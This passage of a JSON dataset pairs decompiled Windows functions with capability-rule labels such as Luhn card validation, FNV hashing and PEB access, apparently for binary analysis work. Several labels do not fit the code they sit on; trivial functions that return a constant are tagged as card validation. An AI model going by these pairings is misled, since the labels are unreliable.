        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x00405815)\n\nint32_t __cdecl fcn.0040563a(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iStack52;\n    uint var_ch;\n    \n    if (arg_10h != 0) {\n        iStack52 = 0;\n        do {\n            *(arg_8h + iStack52) = *(arg_ch + iStack52);\n            iStack52 = iStack52 + 1;\n        } while (iStack52 != arg_10h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 157
    },
    "0040208e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl fcn.0040208e(uint *arg_8h, uint8_t *arg_ch, uint *arg_10h)\n\n{\n    uint var_bp_ch;\n    \n    *arg_ch = *arg_8h * *arg_10h + 4U ^ *arg_ch;\n    return;\n}\n",
        "token_count": 84
    },
    "00402de1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402de1(int32_t arg_8h)\n\n{\n    int32_t in_FS_OFFSET;\n    uint var_4h;\n    \n    return *(in_FS_OFFSET + arg_8h);\n}\n",
        "token_count": 49
    },
    "004031d2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nuint fcn.004031d2(void)\n\n{\n    int32_t in_FS_OFFSET;\n    uint var_2h;\n    \n    return *(*(in_FS_OFFSET + 0x18) + 0x30);\n}\n",
        "token_count": 64
    },
    "004037b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004037b6(void)\n\n{\n    return 0x439000;\n}\n",
        "token_count": 21
    },
    "00405297": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00405297(void)\n\n{\n    int32_t in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    return *(in_FS_OFFSET + 0x18);\n}\n",
        "token_count": 45
    }
}